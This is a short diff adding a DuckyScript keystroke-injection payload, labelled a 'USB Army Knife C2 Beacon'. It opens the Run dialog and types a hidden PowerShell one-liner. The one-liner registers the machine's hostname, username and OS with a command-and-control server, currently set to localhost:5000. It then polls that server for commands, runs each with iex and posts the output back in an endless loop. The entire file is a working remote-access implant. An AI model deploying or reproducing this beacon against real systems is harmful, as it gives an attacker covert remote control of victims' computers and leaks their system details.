@@ -1,0 +1,10 @@
+REM ========================================
+REM USB Army Knife C2 Beacon
+REM Server: http://localhost:5000
+REM ========================================
+
+REM Open PowerShell hidden
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -c "$c2='http://localhost:5000';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$o=[System.Environment]::OSVersion.VersionString;$bid='';while($true){try{if(!$bid){$reg=@{hostname=$h;username=$u;os=$o;metadata=@{}}|ConvertTo-Json;$r=Invoke-RestMethod -Uri $c2/api/beacon/register -Method POST -Body $reg -ContentType 'application/json';$bid=$r.beacon_id};$chk=Invoke-RestMethod -Uri $c2/api/beacon/checkin/$bid -Method POST -ContentType 'application/json';$chk.commands|%{$cid=$_.id;$cmd=$_.command;$out=iex $cmd 2>&1|Out-String;Invoke-RestMethod -Uri $c2/api/beacon/result/$cid -Method POST -Body (@{result=$out}|ConvertTo-Json) -ContentType 'application/json'};Start-Sleep 60}catch{Start-Sleep 10}}"
+ENTER
